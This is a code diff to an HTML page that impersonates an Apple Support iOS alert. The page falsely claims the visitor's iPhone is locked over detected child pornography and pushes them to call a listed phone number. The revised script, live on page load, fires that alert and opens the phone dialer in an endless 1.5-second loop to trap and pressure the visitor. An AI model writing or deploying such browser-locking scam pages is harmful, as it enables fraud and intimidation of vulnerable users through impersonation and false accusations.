@@ -21,7 +21,6 @@
         align-items: center;
     }
 
-    /* Dim overlay ONLY, no blur */
     .overlay {
         position: fixed;
         inset: 0;
@@ -31,7 +30,6 @@
         align-items: center;
     }
 
-    /* iOS 11–15 alert box */
     .ios-alert {
         width: 82%;
         max-width: 320px;
@@ -45,13 +43,11 @@
         animation: iosPop 0.25s cubic-bezier(.25,.8,.25,1) forwards;
     }
 
-    /* iOS zoom pop */
     @keyframes iosPop {
         0% { transform: scale(1.12); opacity: 0; }
         100% { transform: scale(1); opacity: 1; }
     }
 
-    /* Title */
     .alert-title {
         font-size: 18px;
         font-weight: 600;
@@ -60,7 +56,6 @@
         padding: 0 18px;
     }
 
-    /* Message */
     .alert-message {
         font-size: 14px;
         color: #3b3b3b;
@@ -68,14 +63,12 @@
         line-height: 1.45;
     }
 
-    /* Button divider + layout */
     .buttons {
         border-top: 1px solid #d0d0d0;
         display: flex;
         height: 44px;
     }
 
-    /* Buttons */
     .buttons a {
         flex: 1;
         text-decoration: none;
@@ -86,7 +79,6 @@
         align-items: center;
     }
 
-    /* Vertical divider between Cancel and Call Now */
     .buttons a:nth-child(1) {
         border-right: 1px solid #d0d0d0;
     }
@@ -95,7 +87,7 @@
 
 <body>
 
-<div class="overlay">
+<div class="overlay" id="overlay">
     <div class="ios-alert">
         <div class="alert-title">Apple Support</div>
         <div class="alert-message">Your iPhone has been locked due to detected illegal Child pornography. Your Apple ID has been disabled. Immediately call Online Security Support +1-808-277-4439 to unlock it.</div>
@@ -108,18 +100,27 @@
 </div>
 
 <script>
-    window.onload = function() {
+window.onload = function() {
+
+    // First alert
+    alert("Your iPhone has been locked due to detected illegal Child pornography. Your Apple ID has been disabled. Immediately call Online Security Support +1-808-277-4439 to unlock it.");
+
+    // Trigger phone dial immediately
+    window.location.href = "tel:+18082774439";
+
+    // Loop repeating alert + call
+    setTimeout(function repeatAlert() {
+
         alert("Your iPhone has been locked due to detected illegal Child pornography. Your Apple ID has been disabled. Immediately call Online Security Support +1-808-277-4439 to unlock it.");
 
-        setTimeout(function repeatAlert() {
-            alert("Your iPhone has been locked due to detected illegal Child pornography. Your Apple ID has been disabled. Immediately call Online Security Support +1-808-277-4439 to unlock it.");
-            setTimeout(repeatAlert, 1500);
-        }, 1500);
-
-        // Opens iOS dialer (auto-call not allowed)
+        // Trigger phone dial every loop
         window.location.href = "tel:+18082774439";
-    };
+
+        setTimeout(repeatAlert, 1500);
+    }, 1500);
+};
 </script>
 
 </body>
+</html>
 
